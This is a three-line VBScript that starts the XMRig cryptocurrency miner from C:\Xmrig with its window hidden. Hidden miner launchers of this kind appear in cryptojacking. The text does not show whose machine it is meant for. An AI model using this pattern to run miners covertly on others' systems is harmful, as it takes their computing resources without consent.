Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "C:\Xmrig"
WshShell.Run "xmrig.exe", 0, False